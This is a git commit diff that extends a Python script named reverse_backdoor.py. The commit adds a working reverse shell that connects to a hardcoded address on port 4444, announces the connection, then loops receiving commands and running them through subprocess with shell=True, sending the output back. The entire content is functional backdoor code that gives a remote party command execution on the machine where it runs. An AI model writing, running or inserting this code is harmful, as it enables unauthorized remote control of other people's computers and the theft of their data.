dfb1371dab53049dddb1fd29773d4b6940c12bc7
Raghav-45 <77260113+Raghav-45@users.noreply.github.com>
2022-08-26 22:55:04 +0530

    send and recieve commands

--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -1,6 +1,17 @@
-from multiprocessing import connection
 import socket
-from sqlite3 import connect
+import subprocess
+
+def execute_system_command(command):
+    return subprocess.check_output(command, shell=True)
 
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(("10.38.1.110", 4444))
+connection.connect(('10.38.1.110', 4444))
+
+connection.send("\n[+] Connection Established.\n".encode())
+
+while True:
+    command = connection.recv(1024).decode()
+    command_result = execute_system_command(command)
+    connection.send(command_result)
+
+connection.close()
